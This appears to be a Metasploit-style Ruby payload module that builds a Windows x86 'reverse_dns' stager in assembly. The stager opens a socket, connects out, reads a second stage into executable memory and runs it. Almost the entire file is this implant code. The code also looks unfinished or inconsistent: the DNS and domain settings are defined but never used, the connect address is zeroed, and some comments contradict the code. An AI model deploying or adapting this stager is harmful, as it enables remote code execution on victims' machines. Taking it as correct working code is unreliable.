# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/send_uuid'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'

module Msf

###
#
# Complex reverse_dns payload generation for Windows ARCH_X86
#
###

module Payload::Windows::ReverseDns

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Windows::Exitfunk

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      ns_server:        ds['NS_SERVER'],
      domain:        ds['DOMAIN'],
      retry_count: ds['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = ds['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_dns(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_dns(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_dns(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_dns(opts)}
      #{asm_block_recv(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
    space += 29

    # Reliability adds some bytes!
    space += 44

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [String]  :domain DOMAIN that wll be used for tunnel
  # @option opts [String]  :ns_server Optional: NS server, that will be used.
  # @option opts [Integer] :retry_count Number of retry attempts
  #
  def asm_reverse_dns(opts={})

    retry_count  = [opts[:retry_count].to_i, 1].max
    domain       = opts[:domain]
    ns_server    = opts[:ns_server]

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI ...
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
      jmp reverse_dns
      
      hostname:
        db "aaaa.stg0.#{opts[:host]}", 0x00
      ns_server:
        db "#{opts[:ns_server]}", 0x00
        
      reverse_dns:
        push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
        push 'ws2_'             ; ...
        push esp                ; Push a pointer to the "ws2_32" string on the stack.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp                ; LoadLibraryA( "ws2_32" )

        mov eax, 0x0202         ; EAX = wVersionRequested
        sub esp, eax            ; alloc some space for the WSAData structure
        push esp                ; push a pointer to this stuct
        push eax                ; push the wVersionRequested parameter
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
        call ebp                ; WSAStartup( 0x0190, &WSAData );

      set_address:
        push #{retry_count}     ; retry counter
     
      create_socket:
        push 0                 ; host in little-endian format
        push 0                 ; family AF_INET and port number
        mov esi, esp            ; save pointer to sockaddr struct

        push eax                ; if we succeed, eax will be zero, push zero for the flags param.
        push eax                ; push null for reserved parameter
        push eax                ; we do not specify a WSAPROTOCOL_INFO structure
        push eax                ; we do not specify a protocol
        inc eax                 ;
        push eax                ; push SOCK_STREAM
        inc eax                 ;
        push eax                ; push AF_INET
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
        xchg edi, eax           ; save the socket for later, don't care about the value of eax after this

      try_connect:
        push 16                 ; length of the sockaddr struct
        push esi                ; pointer to the sockaddr struct
        push edi                ; the socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
        call ebp                ; connect( s, &sockaddr, 16 );

        test eax,eax            ; non-zero means a failure
        jz connected

      handle_connect_failure:
        ; decrement our attempt count and try again
        dec dword [esi+8]
        jnz try_connect
    ^

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        push 0x56A2B5F0         ; hardcoded to exitprocess for size
        call ebp
      ^
    end

    asm << %Q^
      ; this  lable is required so that reconnect attempts include
      ; the UUID stuff if required.
      connected:
    ^

    asm << asm_send_uuid if include_send_uuid

    asm
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_block_recv(opts={})
    reliable     = opts[:reliable]
    asm = %Q^
      recv:
        ; Receive the size of the incoming second stage...
        push 0                  ; flags
        push 4                  ; length = sizeof( DWORD );
        push esi                ; the 4 byte buffer on the stack to hold the second stage length
        push edi                ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp                ; recv( s, &dwLength, 4, 0 );
    ^

    if reliable
      asm << %Q^
        ; reliability: check to see if the recv worked, and reconnect
        ; if it fails
        cmp eax, 0
        jle cleanup_socket
      ^
    end

    asm << %Q^
        ; Alloc a RWX buffer for the second stage
        mov esi, [esi]          ; dereference the pointer to the second stage length
        push 0x40               ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; MEM_COMMIT
        push esi                ; push the newly recieved second stage length.
        push 0                  ; NULL as we dont care where the allocation is.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        xchg ebx, eax           ; ebx = our new memory address for the new stage
        push ebx                ; push the address of the new stage so we can return into it

      read_more:
        push 0                  ; flags
        push esi                ; length
        push ebx                ; the current address into our second stage's RWX buffer
        push edi                ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp                ; recv( s, buffer, length, 0 );
    ^

    if reliable
      asm << %Q^
        ; reliability: check to see if the recv worked, and reconnect
        ; if it fails
        cmp eax, 0
        jge read_successful

        ; something failed, free up memory
        pop eax                 ; get the address of the payload
        push 0x4000             ; dwFreeType (MEM_DECOMMIT)
        push 0                  ; dwSize
        push eax                ; lpAddress
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)

      cleanup_socket:
        ; clear up the socket
        push edi                ; socket handle
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call ebp                ; closesocket(socket)

        ; restore the stack back to the connection retry count
        pop esi
        pop esi
        dec [esp]               ; decrement the counter

        ; try again
        jmp create_socket
      ^
    end

    asm << %Q^
      read_successful:
        add ebx, eax            ; buffer += bytes_received
        sub esi, eax            ; length -= bytes_received, will set flags
        jnz read_more           ; continue if we have more to read
        ret                     ; return into the second stage
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end
